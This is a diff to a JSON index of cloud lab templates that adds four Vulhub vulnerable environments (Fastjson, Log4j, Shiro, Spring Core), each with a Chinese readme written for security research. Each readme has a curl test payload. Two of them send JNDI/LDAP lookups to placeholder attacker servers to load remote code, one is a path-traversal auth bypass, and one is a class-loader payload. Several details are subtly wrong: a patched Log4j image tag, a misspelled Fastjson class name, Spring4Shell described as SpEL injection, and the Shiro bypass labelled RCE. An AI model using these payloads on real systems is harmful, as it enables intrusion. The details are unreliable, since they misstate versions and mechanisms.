@@ -1,5 +1,5 @@
 {
-  "updated_at": "2026-02-19T11:36:19.839136Z",
+  "updated_at": "2026-02-21T13:41:34.560891Z",
   "repo_name": "redc-template",
   "templates": {
     "aliyun/ecs": {
@@ -1399,6 +1399,82 @@
         "author": "r0fus0d",
         "description": "Compose 示例",
         "readme": "# 场景使用\n\n简单示例：同时部署阿里云和火山云 ECS\n\n使用模板自带的默认配置，无需传递额外变量\n"
+      }
+    },
+    "vulhub/fastjson-rce": {
+      "id": "vulhub/fastjson-rce",
+      "provider": "vulhub",
+      "slug": "fastjson-rce",
+      "versions": {
+        "1.0.0": {
+          "url": "https://redc.wgpsec.org/templates/vulhub_fastjson-rce_v1.0.0.zip",
+          "sha256": "9db457546c58094173f6001112777036a2dfad7f3ec6df0f8f9607d56330e189",
+          "updated_at": "2026-02-21T13:41:34.558690Z"
+        }
+      },
+      "latest": "1.0.0",
+      "metadata": {
+        "name": "fastjson-rce",
+        "author": "redc",
+        "description": "Fastjson 反序列化远程代码执行漏洞，攻击者可利用 autotype 机制执行任意代码",
+        "readme": "# Fastjson 远程代码执行\n\n## 漏洞简介\n\nFastjson 是一个高性能的 JSON 库，但其 autotype 机制存在反序列化漏洞，攻击者可以通过构造特殊的 JSON 数据来触发 JNDI 注入或执行任意代码。\n\n## 漏洞信息\n\n- **漏洞类型**: RCE (远程代码执行)\n- **危险等级**: High (高危)\n- **影响版本**: Fastjson < 1.2.48\n\n## 环境信息\n\n- **镜像**: vulhub/fastjson:1.2.47\n- **端口**: 8090\n- **服务**: Fastjson RCE 测试环境\n\n## 使用方法\n\n1. 在云服务器上执行 userdata 脚本\n2. 脚本会自动安装 Docker 并启动 Fastjson 漏洞环境\n3. 访问 `http://<your-ip>:8090` 进行测试\n\n## 测试方法\n\n```bash\n# 发送恶意 JSON 数据（需要 JNDI 工具配合）\ncurl -X POST \"http://<your-ip>:8090\" -d '{\"@type\":\"com.sun.rowset.JdbcRowSet1\",\"dataSourceName\":\"ldap://<attacker>/Exploit\",\"autoCommit\":true}'\n```\n\n## 注意事项\n\n- 此环境仅用于安全研究\n- 请在防火墙中限制访问来源\n- 测试完成后请及时删除环境\n\n## 参考链接\n\n- [Vulhub Fastjson 漏洞环境](https://github.com/vulhub/vulhub/tree/master/fastjson)\n"
+      }
+    },
+    "vulhub/log4j-rce": {
+      "id": "vulhub/log4j-rce",
+      "provider": "vulhub",
+      "slug": "log4j-rce",
+      "versions": {
+        "1.0.0": {
+          "url": "https://redc.wgpsec.org/templates/vulhub_log4j-rce_v1.0.0.zip",
+          "sha256": "9db5322525cb5e7fad8db13275f0cbdc9107abdd387413f1345588454cb738a0",
+          "updated_at": "2026-02-21T13:41:34.559562Z"
+        }
+      },
+      "latest": "1.0.0",
+      "metadata": {
+        "name": "log4j-rce",
+        "author": "redc",
+        "description": "Apache Log4j2 JNDI 远程代码执行漏洞，又称 Log4Shell",
+        "readme": "# Log4j RCE (CVE-2021-44228)\n\n## 漏洞简介\n\nApache Log4j2 JNDI 远程代码执行漏洞，又称 Log4Shell，是近年来最严重的漏洞之一。攻击者可以利用 Log4j 的日志记录功能，通过构造特殊的日志消息来触发 JNDI 远程加载，从而执行任意代码。\n\n## CVE 信息\n\n- **CVE 编号**: CVE-2021-44228\n- **漏洞类型**: RCE (远程代码执行)\n- **危险等级**: Critical (严重)\n- **影响版本**: Log4j 2.0 ~ 2.14.1\n\n## 环境信息\n\n- **镜像**: vulhub/log4j:2.17.0\n- **端口**: 8989\n- **服务**: Log4j RCE 测试环境\n\n## 使用方法\n\n1. 在云服务器上执行 userdata 脚本\n2. 脚本会自动安装 Docker 并启动 Log4j 漏洞环境\n3. 访问 `http://<your-ip>:8989` 进行测试\n\n## 测试方法\n\n```bash\n# 使用 curl 发送恶意请求\ncurl -X GET \"http://<your-ip>:8989\" -H \"X-Api-Version: \\${jndi:ldap://<your-attacker-server>/Exploit}\"\n```\n\n## 注意事项\n\n- 此环境仅用于安全研究\n- 请在防火墙中限制访问来源\n- 测试完成后请及时删除环境\n\n## 参考链接\n\n- [Vulhub Log4j 漏洞环境](https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228)\n- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)\n"
+      }
+    },
+    "vulhub/shiro-rce": {
+      "id": "vulhub/shiro-rce",
+      "provider": "vulhub",
+      "slug": "shiro-rce",
+      "versions": {
+        "1.0.0": {
+          "url": "https://redc.wgpsec.org/templates/vulhub_shiro-rce_v1.0.0.zip",
+          "sha256": "602b48554df67c31b2e5ef0ad30e3bc3e457a87bc904b368402f22255660c288",
+          "updated_at": "2026-02-21T13:41:34.560168Z"
+        }
+      },
+      "latest": "1.0.0",
+      "metadata": {
+        "name": "shiro-rce",
+        "author": "redc",
+        "description": "Apache Shiro 认证绕过漏洞，攻击者可构造特殊 URL 绕过身份验证",
+        "readme": "# Shiro RCE (CVE-2020-1957)\n\n## 漏洞简介\n\nApache Shiro 是一个强大的安全框架，用于身份验证、授权、加密和会话管理。CVE-2020-1957 是 Apache Shiro 的认证绕过漏洞，攻击者可以通过构造特殊的 URL 路径来绕过身份验证。\n\n## CVE 信息\n\n- **CVE 编号**: CVE-2020-1957\n- **漏洞类型**: RCE / 认证绕过\n- **危险等级**: High (高危)\n- **影响版本**: Shiro < 1.5.2\n\n## 环境信息\n\n- **镜像**: vulhub/shiro:1.4.2\n- **端口**: 8080\n- **服务**: Shiro RCE 测试环境\n\n## 使用方法\n\n1. 在云服务器上执行 userdata 脚本\n2. 脚本会自动安装 Docker 并启动 Shiro 漏洞环境\n3. 访问 `http://<your-ip>:8080` 进行测试\n\n## 测试方法\n\n```bash\n# 构造认证绕过请求\ncurl -X GET \"http://<your-ip>:8080/xxx/../admin/page\"\n```\n\n## 注意事项\n\n- 此环境仅用于安全研究\n- 请在防火墙中限制访问来源\n- 测试完成后请及时删除环境\n\n## 参考链接\n\n- [Vulhub Shiro 漏洞环境](https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2020-1957)\n- [NVD CVE-2020-1957](https://nvd.nist.gov/vuln/detail/CVE-2020-1957)\n"
+      }
+    },
+    "vulhub/spring-core-rce": {
+      "id": "vulhub/spring-core-rce",
+      "provider": "vulhub",
+      "slug": "spring-core-rce",
+      "versions": {
+        "1.0.0": {
+          "url": "https://redc.wgpsec.org/templates/vulhub_spring-core-rce_v1.0.0.zip",
+          "sha256": "5f47591ab6ce660249a1521d4234172e01adbeb5a3291d9321fb6a6a0495c274",
+          "updated_at": "2026-02-21T13:41:34.560752Z"
+        }
+      },
+      "latest": "1.0.0",
+      "metadata": {
+        "name": "spring-core-rce",
+        "author": "redc",
+        "description": "Spring Framework 远程代码执行漏洞，攻击者可利用 SpEL 表达式执行任意代码",
+        "readme": "# Spring Core RCE (CVE-2022-22965)\n\n## 漏洞简介\n\nSpring Framework 远程代码执行漏洞，攻击者可利用 SpEL 表达式注入执行任意代码。该漏洞存在于 Spring 框架的参数绑定机制中，通过构造特殊的请求参数可以触发 SpEL 表达式执行。\n\n## CVE 信息\n\n- **CVE 编号**: CVE-2022-22965\n- **漏洞类型**: RCE (远程代码执行)\n- **危险等级**: Critical (严重)\n- **影响版本**: Spring Framework 5.3.0 ~ 5.3.17\n\n## 环境信息\n\n- **镜像**: vulhub/spring-core-rce\n- **端口**: 8080\n- **服务**: Spring Core RCE 测试环境\n\n## 使用方法\n\n1. 在云服务器上执行 userdata 脚本\n2. 脚本会自动安装 Docker 并启动 Spring Core 漏洞环境\n3. 访问 `http://<your-ip>:8080` 进行测试\n\n## 测试方法\n\n```bash\n# 使用 curl 发送恶意请求（需要根据实际环境调整）\ncurl -X POST \"http://<your-ip>:8080\" -d \"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%23\"\n```\n\n## 注意事项\n\n- 此环境仅用于安全研究\n- 请在防火墙中限制访问来源\n- 测试完成后请及时删除环境\n\n## 参考链接\n\n- [Vulhub Spring Core RCE 漏洞环境](https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965)\n- [NVD CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)\n"
       }
     }
   }
